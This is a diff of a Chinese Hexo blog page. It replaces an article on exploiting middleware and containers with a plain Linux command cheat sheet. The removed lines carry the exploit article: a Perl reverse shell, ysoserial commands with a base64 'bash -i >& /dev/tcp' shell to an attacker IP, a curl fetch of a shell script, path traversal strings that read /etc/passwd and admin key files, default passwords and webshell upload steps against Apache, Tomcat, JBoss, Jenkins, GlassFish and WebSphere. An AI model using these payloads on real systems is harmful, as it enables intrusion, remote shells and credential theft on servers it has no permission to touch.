@@ -4,8 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="服务安全-中间件&amp;容器, 白芨的小屋">
-    <meta name="description" content="Nginx，Apache，Tomcat，Weblogic，JBoos，Jenkin，GlassFish，Webshere，Docker，Jetty">
+    <meta name="keywords" content="白芨的小屋">
+    <meta name="description" content="title: linux常用命令补充
+top: true
+cover: false
+toc: true
+mathjax: false
+date: 2022-05-20 17:22:32
+author: 白芨
+img: &amp;#x2F;media">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +24,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>服务安全-中间件&amp;容器 | 白芨的小屋</title>
+    <title>白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +316,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/ser/server.jpeg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">服务安全-中间件&amp;容器</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -428,29 +435,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
-                                <span class="chip bg-color">中间件</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%AE%B9%E5%99%A8/">
-                                <span class="chip bg-color">容器</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="post-category">
-                                服务安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -459,7 +449,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-20
+                    2021-12-15
                 </div>
                 
 
@@ -468,7 +458,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.1k
+                    2.2k
                 </div>
                 
 
@@ -488,258 +478,563 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="服务安全-中间件-amp-容器"><a href="#服务安全-中间件-amp-容器" class="headerlink" title="服务安全-中间件&amp;容器"></a>服务安全-中间件&amp;容器</h1><h2 id="1、中间件-Nginx"><a href="#1、中间件-Nginx" class="headerlink" title="1、中间件-Nginx"></a>1、中间件-Nginx</h2><p><strong>文件解析&amp;命令执行</strong></p>
-<h3 id="1-1、后缀解析"><a href="#1-1、后缀解析" class="headerlink" title="1.1、后缀解析"></a>1.1、后缀解析</h3><p><strong>原因：</strong>配置不当：该漏洞与Nginx、php版本无关，属于<strong>用户配置不当</strong>造成的解析漏洞。</p>
-<p><strong>利用：</strong>在上传图片路径后增加<code>&#39;/xxx.php&#39;</code>后缀，被解析成PHP文件：</p>
-<h3 id="1-2、CVE-2013-4547-文件名逻辑漏洞"><a href="#1-2、CVE-2013-4547-文件名逻辑漏洞" class="headerlink" title="1.2、CVE-2013-4547-文件名逻辑漏洞"></a>1.2、CVE-2013-4547-文件名逻辑漏洞</h3><p><strong>CVE-2013-4547</strong></p>
-<p><strong>影响版本：</strong>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
-<p><strong>利用：</strong></p>
-<ul>
-<li>上传时修改文件名为<code>x.jpg[0x20][0x00].php</code></li>
-<li><code>[0x20]是空格，[0x00]是&#39;\0&#39;</code>,可使用<code>burp-&gt;repeater-&gt;hex</code>中修改。</li>
-</ul>
-<p><strong>参考：</strong><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/nginx/CVE-2013-4547/">https://vulhub.org/#/environments/nginx/CVE-2013-4547/</a></p>
-<h2 id="2、中间件-Apache"><a href="#2、中间件-Apache" class="headerlink" title="2、中间件-Apache"></a>2、中间件-Apache</h2><h3 id="2-1、cve-2021-42013-RCE"><a href="#2-1、cve-2021-42013-RCE" class="headerlink" title="2.1、cve_2021_42013 - RCE"></a>2.1、cve_2021_42013 - RCE</h3><p><strong>影响版本：</strong>Apache 2.4.49 和 Apache 2.4.50</p>
-<p><strong>利用：</strong>抓包，修改数据包反弹shell</p>
-<p>**Poc:**（反弹地址：120.55.xx.xx、监听5566端口）</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh 
-...
-...
-...
+                <pre class="line-numbers language-none"><code class="language-none">title: linux常用命令补充
+top: true
+cover: false
+toc: true
+mathjax: false
+date: 2022-05-20 17:22:32
+author: 白芨
+img: &#x2F;medias&#x2F;banner&#x2F;linux.jpeg
+coverImg: 
+password: 
+summary: Linux中一些看似常用又不常用有时候又不得不用的命令。
+tags: 
+- linux
+categories: 基础篇<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-echo;perl -e &#39;use Socket;$i&#x3D;&quot;120.55.xx.xx&quot;;$p&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="2-2、cve-2021-41773-目录穿越"><a href="#2-2、cve-2021-41773-目录穿越" class="headerlink" title="2.2、cve_2021_41773 - 目录穿越"></a>2.2、cve_2021_41773 - 目录穿越</h3><p>影响版本：Apache HTTP Server 2.4.49、2.4.50</p>
-<p>版本对路径规范化所做的更改中存在一个<strong>路径穿越漏洞</strong>，攻击者可利用该漏洞<strong>读取到Web目录外的其他文件，如系统配置文件、网站源码等</strong>，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p>
-<p><strong>使用Burp：GET请求：</strong></p>
-<p><strong>cve_2021_41773 - 目录穿越-POC</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>补充：</strong></p>
-<p><strong>CVE-2021-41773</strong>漏洞在<strong>v2.4.50</strong>版本中进行了修复。但修复版本中只处理了<code>/xx/.%2e/</code>这样的路径，而没有正确处理<code>/.%%32%65/</code>这种字符串，导致<code>/.%%32%65/</code>被带入后续的处理，<strong>仍然可造成目录穿越</strong>。攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。</p>
-<p><strong>URL编码：</strong><code>2e -- &gt; %32%65</code></p>
-<p><strong>cve_2021_42013 - 目录穿越-POC</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;icons&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>参考：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0ading/p/15406905.html">https://www.cnblogs.com/L0ading/p/15406905.html</a></p>
-<h3 id="2-3、cve-2017-15715-文件解析"><a href="#2-3、cve-2017-15715-文件解析" class="headerlink" title="2.3、cve-2017-15715 - 文件解析"></a><strong>2.3、cve-2017-15715 - 文件解析</strong></h3><p><strong>影响版本：</strong>2.4.0~2.4.29版本存在一个解析漏洞</p>
-<p>解析PHP时，1.php[0x0A]将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p><strong>利用：</strong>（配合文件上传，适用于黑名单策略绕过）</p>
-<ul>
-<li>通过16进制的方式在<code>1.php</code>后面插入一个<code>0A</code></li>
-<li>可使用<code>burp-&gt;repeater-&gt;hex</code>中修改。</li>
-<li>访问上传成功的文件<code>/1.php%0a</code></li>
-</ul>
-<p>参考：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a></p>
-<h2 id="3、中间件-Tomcat"><a href="#3、中间件-Tomcat" class="headerlink" title="3、中间件-Tomcat"></a>3、中间件-Tomcat</h2><h3 id="3-1、弱口令猜解"><a href="#3-1、弱口令猜解" class="headerlink" title="3.1、弱口令猜解"></a>3.1、弱口令猜解</h3><p>配置不当导致后台弱口令，可通过上传<code>jsp</code>压缩包改名的<code>war</code>拿<code>shell</code></p>
-<p>可通过哥斯拉生成<code>jsp</code>后门 –&gt; 压缩zip，修改后缀war</p>
-<h3 id="3-2、CVE-2017-12615-文件上传"><a href="#3-2、CVE-2017-12615-文件上传" class="headerlink" title="3.2、CVE-2017-12615  - 文件上传"></a>3.2、CVE-2017-12615  - 文件上传</h3><p>当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了<strong>HTTP PUT</strong>请求方法（ 例如， 将<code>readonly</code>初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的<code>JSP</code>的<code>webshell</code>文件，<code>JSP</code>文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p>
-<p><strong>影响版本：</strong>Apache Tomcat 7.0.0 - 7.0.79</p>
-<pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1
-
-shell代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="3-3、CVE-2020-1938-文件包含"><a href="#3-3、CVE-2020-1938-文件包含" class="headerlink" title="3.3、CVE-2020-1938 文件包含"></a>3.3、CVE-2020-1938 文件包含</h3><p>Apache Tomcat AJP协议（<strong>默认8009端口</strong>）由于存在实现缺陷导致相关<strong>参数可控</strong>，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p>
-<p><strong>影响版本：</strong></p>
-<ul>
-<li>Tomcat 6.*</li>
-<li>Tomcat 7.* &lt; 7.0.100</li>
-<li>Tomcat 8.* &lt; 8.5.51</li>
-<li>Tomcat 9.* &lt; 9.0.31</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CNVD-2020-10487-Tomcat-Ajp-lfi.py <span class="token number">120.55</span>.xx.xx -p <span class="token number">8009</span> -f WEB-INF/web.xml
-<span class="token comment"># exp: CNVD-2020-10487-Tomcat-Ajp-lfi.py</span>
-<span class="token comment"># https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="4、中间件-Weblogic"><a href="#4、中间件-Weblogic" class="headerlink" title="4、中间件-Weblogic"></a>4、中间件-Weblogic</h2><p>管理控制台默认端口：http协议7001，https协议7002</p>
-<p>管理控制台默认URL路径：/console</p>
-<p>管理控制台默认URL路径：console/login/LoginForm.jsp</p>
-<p>CVE_2017_3506  </p>
-<p>CVE_2018_2893 </p>
-<p>CVE_2018_3245 </p>
-<p>CVE_2020_14882 </p>
-<p>CVE_2021_2394  </p>
-<h2 id="5、中间件-JBoos"><a href="#5、中间件-JBoos" class="headerlink" title="5、中间件-JBoos"></a>5、中间件-JBoos</h2><p>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，</p>
-<p><strong>Red Hat JBoss Application Server</strong> 是一款基于<strong>JavaEE的开源应用服务器</strong>。</p>
-<h3 id="5-1、CVE-2017-12149"><a href="#5-1、CVE-2017-12149" class="headerlink" title="5.1、CVE-2017-12149"></a>5.1、CVE-2017-12149</h3><p><strong>JBOOS AS 5.X/6.X 反序列化漏洞</strong></p>
-<p><strong>影响版本：Jboss 5.x、Jboss6.x</strong></p>
-<p>1、访问<code>http://xx.xx.xx.xx:8080/invoker/readonly</code>，若显示HTTP Status 500,则说明存在漏洞</p>
-<p>2、使用**<code>ysoserial.jar</code>**这个工具生成各种反序列化的poc或者exp，里面包含了各种各样的反射链所使用到的库。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成poc.ser</span>
-java -jar ysoserial.jar CommonsCollections5 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token operator">></span> poc.ser
-
-<span class="token comment"># post请求将poc.ser发送到漏洞存在页面地址</span>
-<span class="token function">curl</span> http://xx.xx.xx.xx:8080/invoker/readonly --data-binary @poc.ser
-
-<span class="token comment"># 监听5566端口</span>
-<span class="token comment"># YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx</span>
-<span class="token comment"># bash -i >&amp; /dev/tcp/120.55.xx.xx/5566 0>&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="5-2、CVE-2017-7504"><a href="#5-2、CVE-2017-7504" class="headerlink" title="5.2、CVE-2017-7504"></a>5.2、CVE-2017-7504</h3><p><strong>JBoss AS 4.x</strong>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>⽂件存在反序列化</p>
-<p>漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p>
-<p><strong>JBoss &lt;=4.x JBossMQJMS</strong> 反序列化漏洞</p>
-<p><strong>影响版本：JBoss AS 4.x及之前版本</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成poc.ser</span>
-java -jar ysoserial.jar CommonsCollections5 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token operator">></span> poc.ser
-
-<span class="token comment"># post请求将poc.ser发送到漏洞存在页面地址</span>
-<span class="token function">curl</span> http://xx.xx.xx.xx:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
-
-<span class="token comment">#监听5566端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="5-3、Administration-Console-弱口令"><a href="#5-3、Administration-Console-弱口令" class="headerlink" title="5.3、Administration Console 弱口令"></a><strong>5.3、Administration Console</strong> 弱口令</h3><p>Administration Console管理页面存在弱口令，admin:admin</p>
-<h2 id="6、中间件-Jenkins"><a href="#6、中间件-Jenkins" class="headerlink" title="6、中间件-Jenkins"></a>6、中间件-Jenkins</h2><p>默认端口：8080，Jenkins是一个开源软件项目，是<strong>基于Java开发的一种持续集成工具，用于监控持续重复的工作</strong>。</p>
-<h3 id="6-1、CVE-2017-1000353-RCE"><a href="#6-1、CVE-2017-1000353-RCE" class="headerlink" title="6.1、CVE-2017-1000353-RCE"></a>6.1、CVE-2017-1000353-RCE</h3><p><strong>影响版本：</strong></p>
-<ul>
-<li>所有Jenkins主版本均受到影响（包括&lt;=2.56版本）</li>
-<li>所有Jenkins LTS 均受到影响（包括&lt;=2.46.1版本）</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成jenkins_poc.ser</span>
-<span class="token comment"># http://github.com/vulhub/CVE-2017-1000353    此exp使用JDK-1.8.0_291 其他版本失效</span>
-java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>
-
-<span class="token comment"># 利用python发送jenkins_poc.ser</span>
-python exploit.py http://xx.xx.xx.xx:8080 jenkins_poc.ser
-
-<span class="token comment">#监听5566端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="6-2、CVE-2018-1000861-RCE"><a href="#6-2、CVE-2018-1000861-RCE" class="headerlink" title="6.2、CVE-2018-1000861-RCE"></a>6.2、CVE-2018-1000861-RCE</h3><p><strong>影响版本：</strong></p>
-<ul>
-<li>Jenkins 2.153及更早版本</li>
-<li>LTS 2.138.3及更早版本</li>
-<li>app=“Jenkins”</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># exp：https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span>
-<span class="token comment"># 解决直接反弹shell无法监听，且命令执行无回显</span>
-<span class="token comment"># 1、通过命令执行使目标下载shell.txt 到本地/tmp/1.sh</span>
-<span class="token comment"># shell.txt: bash -i >&amp; /dev/tcp/120.55.xx.xx/5566 0>&amp;1</span>
-python2 exp.py http://xx.xx.xx.xx:xx/ <span class="token string">"curl -o /tmp/1.sh http://120.55.xx.xx:8888/shell.txt"</span>
-<span class="token comment"># 2、执行shell</span>
-python2 exp.py http://xx.xx.xx.xx:xx/ <span class="token string">"bash /tmp/1.sh"</span>
-
-<span class="token comment"># 开启web服务 python开启可看到实时访问状态</span>
-python3 -m http.server <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7、中间件-GlassFish"><a href="#7、中间件-GlassFish" class="headerlink" title="7、中间件-GlassFish"></a>7、中间件-GlassFish</h2><p><strong>默认端口：4848</strong>，GlassFish 是一款强健的<strong>商业兼容应用服务器</strong></p>
-<h3 id="7-1、CVE-2017-1000028-任意文件读取"><a href="#7-1、CVE-2017-1000028-任意文件读取" class="headerlink" title="7.1、CVE-2017-1000028-任意文件读取"></a>7.1、CVE-2017-1000028-任意文件读取</h3><p><strong>漏洞原理：</strong></p>
-<p>Java语言中会把<code>%c0%ae</code>解析为<code>\uC0AE</code>，最后转义为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到<strong>目录穿越</strong>、<strong>任意文件读取</strong>的效果。</p>
-<p><strong>影响版本：</strong>&lt; 4.1.1</p>
-<pre class="line-numbers language-none"><code class="language-none">读密码：
-&#x2F;theme&#x2F;META-INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile
-
-读windows文件：
-&#x2F;theme&#x2F;META-INF&#x2F;prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows&#x2F;win.ini
-
-读linux文件：
-&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="8、中间件-Webshere"><a href="#8、中间件-Webshere" class="headerlink" title="8、中间件-Webshere"></a>8、中间件-Webshere</h2><p>WebShere 是 <strong>IBM 的软件平台</strong>。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。</p>
-<p><strong>漏洞探测在8880端口，后台是9060端口，解析是9080端口</strong></p>
-<table>
+<h1 id="linux基础命令补充"><a href="#linux基础命令补充" class="headerlink" title="linux基础命令补充"></a>linux基础命令补充</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>多用户操作系统</p>
+<p>/ -&gt; home -&gt; 用户</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="Part1-（终端基础）"><a href="#Part1-（终端基础）" class="headerlink" title="**Part1:**（终端基础）"></a>**Part1:**（终端基础）</h3><table>
 <thead>
 <tr>
-<th>端口</th>
-<th>服务</th>
+<th>命令</th>
+<th>解释</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>9080</td>
-<td>http</td>
+<td><code>pwd</code></td>
+<td>查看当前所在文件夹</td>
 </tr>
 <tr>
-<td>9443</td>
-<td>https</td>
+<td><code>man command</code></td>
+<td>查看<code>command</code>帮助信息</td>
 </tr>
 <tr>
-<td>9060</td>
-<td>管理后台访问端口</td>
+<td><code>.</code>开头</td>
+<td>隐藏文件，<code>ls -a</code> 显示隐藏文件</td>
 </tr>
 <tr>
-<td>9043</td>
-<td>管理控制台安全端口</td>
+<td><code>.</code>&amp;<code>..</code></td>
+<td><code>.</code>当前目录、<code>..</code>上一级目录</td>
 </tr>
 <tr>
-<td>8880</td>
-<td>SOAP连接器端口</td>
+<td><code>cd -</code></td>
+<td>最近两次工作目录间切换</td>
+</tr>
+<tr>
+<td><code>mkdir -p</code></td>
+<td>连续创建多及目录。例：<code>mkdir -p a/b/c</code></td>
+</tr>
+<tr>
+<td><code>rm -r -f</code></td>
+<td><code>-r</code>递归删除目录，删除文件夹必须加此参数。<code>-f</code>强制删除</td>
+</tr>
+<tr>
+<td><code>tree</code></td>
+<td>树状图列出文件目录结果，<code>-d</code>：只显示目录不显示文件</td>
 </tr>
 </tbody></table>
-<p><strong>1、CVE-2015-7450 反序列化</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">探测在8880端口
-java反序列化工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><strong>2、弱口令&amp;未授权访问 上传拿Shell</strong></p>
-<p><strong>在6.x至7.0版本</strong>，后台登陆只需要输入<code>admin</code>作为用户标识，无需密码，即可登陆后台。</p>
-<p>默认账号密码：</p>
+<h3 id="Part2-（文件操作）"><a href="#Part2-（文件操作）" class="headerlink" title="Part2:（文件操作）"></a><strong>Part2:（文件操作）</strong></h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cp -i</code></td>
+<td>文件重复时，提示是否覆盖当前文件</td>
+</tr>
+<tr>
+<td><code>cp -r</code></td>
+<td>递归复制目录</td>
+</tr>
+<tr>
+<td><code>mv -i</code></td>
+<td>提示是否覆盖当前文件</td>
+</tr>
+<tr>
+<td><code>cat &amp; more</code></td>
+<td><code>cat</code>一次 显示所有内容。<code>more</code>分屏显示</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td><code>空格：</code>显示下一屏；<code>enter键：</code>滚动一行；<code>b：</code>回滚一屏；<code>f：</code>前滚一屏；<code>q：</code>退出。<!--空格、f效果一样--></td>
+</tr>
+<tr>
+<td><code>cat</code></td>
+<td>查看文件、创建文件、文件合并、追加文件内容等</td>
+</tr>
+<tr>
+<td><code>cat -b -n</code></td>
+<td>查看并输出编号；<code>-n</code>所有行加编号；<code>-b</code>空行不加编号</td>
+</tr>
+</tbody></table>
+<h3 id="Part-3-（文件内容）"><a href="#Part-3-（文件内容）" class="headerlink" title="Part 3:（文件内容）"></a><strong>Part 3:（文件内容）</strong></h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>grep</td>
+<td>对文件文本内容进行查找</td>
+</tr>
+<tr>
+<td>grep -n</td>
+<td>显示匹配同时指定<strong>行号</strong></td>
+</tr>
+<tr>
+<td>grep -v</td>
+<td>显示不包含匹配文本的所有行（<strong>求反</strong>）</td>
+</tr>
+<tr>
+<td>grep -i</td>
+<td>忽略大小写</td>
+</tr>
+<tr>
+<td><code>^a</code></td>
+<td>行首匹配-搜索行首为<code>a</code>的行</td>
+</tr>
+<tr>
+<td><code>ke$</code></td>
+<td>行尾匹配-搜索行尾为<code>ke</code>的行</td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>输出，覆盖文件原有内容。可结合<code>echo</code>使用</td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>追加，将内容追加到已有文件的末尾。可结合<code>echo</code>使用</td>
+</tr>
+</tbody></table>
+<h3 id="Part-4-（远程）"><a href="#Part-4-（远程）" class="headerlink" title="Part 4:（远程）"></a><strong>Part 4:（远程）</strong></h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>管道：<code>｜</code></td>
+<td>一个命令的输出，可通过管道，作为另一个命令的输入</td>
+</tr>
+<tr>
+<td><code>ssh [-p port] user@remote</code></td>
+<td><code>remote</code>是远程机器地址可<strong>ip/域名</strong></td>
+</tr>
+<tr>
+<td><strong><code>scp</code></strong></td>
+<td><strong>远程拷贝文件</strong>，地址格式同ssh，指定端口大写的<code>-P</code></td>
+</tr>
+<tr>
+<td><code>scp -P port 01.py user@remote:Desktop/01.py</code></td>
+<td>将本地当前目录下的<code>01.py</code>文件复制到远程家目录下的<code>Desktop/01.py</code></td>
+</tr>
+<tr>
+<td><code>scp -P port user@remote:Desktop/01.py 01.py </code></td>
+<td>将远程家目录下的<code>Desktop/01.py</code>文件复制到本地当前目录下的<code>01.py</code></td>
+</tr>
+<tr>
+<td><code>scp -r</code></td>
+<td>可传送文件夹</td>
+</tr>
+</tbody></table>
+<h3 id="Part-5-（SSH高级）"><a href="#Part-5-（SSH高级）" class="headerlink" title="Part 5:（SSH高级）"></a><strong>Part 5:（SSH高级）</strong></h3><p><strong>ssh配置信息保存在用户家目录<code>.ssh</code>目录下</strong></p>
+<p><strong>1、免密码登录</strong></p>
 <ul>
-<li>websphere/ websphere</li>
-<li>system/ manager</li>
+<li><p>配置公钥</p>
+<p>执行<code>ssh-keygen</code>,生成SSH公钥。</p>
+</li>
+<li><p>上传公钥到服务器</p>
+<!--让远程服务器记住我们的公钥-->
+
+<p>执行<code>ssh-copy-id -p port user@remote</code></p>
+</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 上传：war马</span>
-Applications --<span class="token operator">></span> websphere enterprise applications --<span class="token operator">></span> <span class="token function">install</span> --<span class="token operator">></span> 上传war包 -<span class="token operator">></span> next<span class="token punctuation">..</span>. -<span class="token operator">></span>设置war包访问路径/1
-<span class="token comment"># 连接：http://xxx/1/1.jsp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>2、配置别名</strong></p>
+<p>自定义名字代替<code>-p port user@remote</code></p>
+<p><code>~/.ssh/config</code>里追加以下内容：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host zhangsan
 
+	Hostname 目标主机ip
 
+	User 目标主机名字
 
-<h2 id="9、Docker安全"><a href="#9、Docker安全" class="headerlink" title="9、Docker安全"></a>9、Docker安全</h2><p>Docker容器是使用<strong>沙盒机制</strong>，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP，就可以<strong>返回一个宿主机的高权限Shell</strong>，并拿到宿主机的<strong>root</strong>权限，可以直接操作宿主机文件。 它从容器中逃了出来，因此我们形象的称为<strong>Docker逃逸漏洞</strong>。</p>
-<p><strong>容器判断:</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 是否存在.dockerenv文件</span>
-<span class="token function">ls</span> -alh /.dockerenv
+	Port <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token comment">#查询系统进程的cgroup信息：</span>
-<span class="token function">cat</span> /proc/1/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>容器逃逸漏洞：权限提升</strong></p>
+<p>保存后 <code>ssh zhangsan</code> 即可登录，<code>scp</code>同样可以使用</p>
+<h3 id="Part-6-（ls命令-amp-通配符）"><a href="#Part-6-（ls命令-amp-通配符）" class="headerlink" title="Part 6:（ls命令&amp;通配符）"></a><strong>Part 6:（ls命令&amp;通配符）</strong></h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls -l</code></td>
